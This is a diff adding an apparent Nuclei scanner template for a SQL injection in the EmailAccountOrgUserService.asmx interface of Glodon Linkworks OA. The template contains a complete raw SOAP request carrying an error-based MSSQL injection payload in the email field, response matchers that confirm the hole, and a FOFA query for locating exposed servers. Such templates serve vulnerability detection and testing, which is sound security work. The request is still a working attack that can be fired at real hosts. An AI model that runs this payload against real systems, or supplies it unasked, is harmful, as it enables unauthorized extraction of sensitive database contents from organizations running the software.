@@ -1,0 +1,48 @@
+id: guanglianda-EmailAccountOrgUserService-sqli
+
+info:
+  name: 广联达-EmailAccountOrgUserService-sql注入漏洞
+  author: candada
+  severity: high
+  description: '广联达 Linkworks办公OA EmailAccountOrgUserService.asmx接口存在SQL注入漏洞，发送请求包后可以获取数据库中的敏感信息'
+  reference:
+    - https://blog.csdn.net/qq_36618918/article/details/135915705?spm=1001.2014.3001.5501
+  tags: 2024,广联达,sqli
+  metadata:
+    fofa-query: app="Glodon-企业管理产品"
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id:                                              
+    cwe-id:                                                    
+    epss-score:                                              
+    epss-percentile:                                           
+    cpe:   
+
+http:
+  - raw:
+      - |
+        POST /Mail/Services/EmailAccountOrgUserService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+        Content-Type: text/xml
+        Content-Length: 547
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetUserInfosByEmail xmlns="http://tempuri.org/">
+        <email>') AND 3515 IN (SELECT (CHAR(107)+CHAR(107)+CHAR(107)+CHAR(107)+(SELECT (CASE WHEN (3515=3515) THEN CHAR(107) ELSE CHAR(48) END))+CHAR(107)+CHAR(107)+CHAR(107)+CHAR(107)+CHAR(107))) AND ('ShLa'='ShLa</email>
+        </GetUserInfosByEmail>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'kkkkkkkkkk'
+      - type: status
+        status:
+          - 500
